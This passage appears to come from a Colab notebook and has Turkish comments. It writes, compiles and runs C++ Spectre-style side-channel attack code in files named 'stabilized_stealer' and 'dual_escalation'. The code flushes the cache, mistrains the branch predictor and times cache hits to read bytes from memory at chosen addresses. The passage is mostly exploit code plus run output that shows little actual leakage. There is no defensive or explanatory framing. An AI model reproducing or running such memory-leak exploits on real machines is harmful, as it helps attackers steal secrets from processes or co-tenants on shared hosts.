                if (j <= boundary) {
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n"
                        : : "r"(x), "r"(dummy_page), "r"(side_channel) : "rax"
                    );
                }
            }
        }
        for (int i = 1; i < 256; i++) {
            uint64_t t1 = __rdtsc();
            if ((__rdtsc() - t1) < 120) hits[i]++;
        }
    }
    uint8_t win = 0; uint32_t max = 0;
    for(int i=1; i<256; i++) if(hits[i] > max) { max = hits[i]; win = i; }
    return win;
}

int main() {
    signal(SIGSEGV, handler);
    memset(side_channel, 1, sizeof(side_channel));
    uintptr_t scan_ptr = 0x555555554000;
    int turn = 0;

    printf("[!] Stabilize Radar-Receiver Pipeline Aktif.\n\n");

    for (int block = 0; block < 10000; block++) {
        uintptr_t current = scan_ptr + (block * PACKAGE_SIZE);

        // L1 radar atıyor
        if (speculative_l1_radar(current)) {
            // L2 alıyor ve RAM'e (Ping-Pong) akıtıyor
            for (int i = 0; i < PACKAGE_SIZE; i++) {
                ping_pong[turn][i] = l2_receiver(current + i);
            }

            printf("[%p] | ", (void*)current);
            for (int i = 0; i < PACKAGE_SIZE; i++) {
                uint8_t c = ping_pong[turn][i];
                if (c > 31 && c < 127) printf("%c", c); else printf(".");
            }
            printf(" | PINGPONG\n");
            fflush(stdout);
            turn = 1 - turn;
        }
    }
    return 0;
}

Writing colab_stabilized_stealer.cpp


In [62]:
!g++ -O3 -mavx2 colab_stabilized_stealer.cpp -o colab_stabilized_stealer && ./colab_stabilized_stealer

[!] Stabilize Radar-Receiver Pipeline Aktif.



In [63]:
%%writefile colab_dual_escalation.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define STRIDE 4096
uint8_t side_channel[256 * STRIDE];
uint8_t dummy_page[STRIDE];
int training_array[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
volatile int array_size = 16;

// Hem L1 hem L2 için spekülatif bariyerleri zorlayan çekirdek
uint8_t dual_escalation_leak(uintptr_t target) {
    uint32_t hits[256] = {0};

    for (int run = 0; run < 200; run++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * STRIDE]);

        // İşlemcinin Branch Predictor'ını eğit (Escalation Hazırlığı)
        int safe_idx = run % array_size;
        for (int j = 20; j >= 0; j--) {
            _mm_clflush((void*)&array_size); // Tahmini zorlaştır
            _mm_mfence();

            // L1 RADAR BURADA: j==0 olduğunda yasaklı target'a spekülatif saldırı başlar
            int x = (j == 0) ? (int)(target - (uintptr_t)training_array) : safe_idx;

            if (sigsetjmp(recovery, 1) == 0) {
                // L2 RECEIVER BURADA: L1'in yönlendirdiği adresi L2 cache hattına çeker
                if (j < array_size) { // İşlemci j'nin her zaman < 16 olduğunu "sanacak"
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"  // L1 Yüklemesi
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n" // L2 Alıcısı (L3 -> L2 Transferi)
                        : : "r"((uintptr_t)x), "r"(training_array), "r"(side_channel) : "rax"
                    );
                }
            }
        }

        // L2 Isısını ölç
        for (int i = 1; i < 256; i++) {
            volatile uint8_t *addr = &side_channel[i * STRIDE];
            uint64_t t1 = __rdtsc();
            (void)*addr;
            if ((__rdtsc() - t1) < 115) hits[i]++;
        }
    }

    uint8_t winner = 0; uint32_t max = 0;
    for(int i=1; i<256; i++) if(hits[i] > max) { max = hits[i]; winner = i; }
    return winner;
}

int main() {
    signal(SIGSEGV, handler);
    memset(side_channel, 1, sizeof(side_channel));
    uintptr_t start_addr = 0x555555554000;

    printf("[!] Dual Escalation: L1 Navigator & L2 Harvester Ready.\n\n");

    for (int i = 0; i < 512; i++) {
        uintptr_t target = start_addr + i;
        uint8_t leaked = dual_escalation_leak(target);

        if (leaked > 31 && leaked < 127) printf("%c", leaked);
        else if (leaked == 0) printf("?"); // Belirsiz
        else printf(".");

        if ((i + 1) % 32 == 0) printf(" | [%p]\n", (void*)target);
        fflush(stdout);
    }
    return 0;
}

Writing colab_dual_escalation.cpp


In [64]:
!g++ -O3 -mavx2 colab_dual_escalation.cpp -o colab_dual_escalation && ./colab_dual_escalation

[!] Dual Escalation: L1 Navigator & L2 Harvester Ready.

................................ | [0x55555555401f]
................................ | [0x55555555403f]
................................ | [0x55555555405f]
...................4............ | [0x55555555407f]
................................ | [0x55555555409f]
................................ | [0x5555555540bf]
................................ | [0x5555555540df]
................................ | [0x5555555540ff]
................................ | [0x55555555411f]
................................ | [0x55555555413f]
................................ | [0x55555555415f]
................................ | [0x55555555417f]
................................ | [0x55555555419f]
................................ | [0x5555555541bf]
................................ | [0x5555555541df]
................................ | [0x5555555541ff]
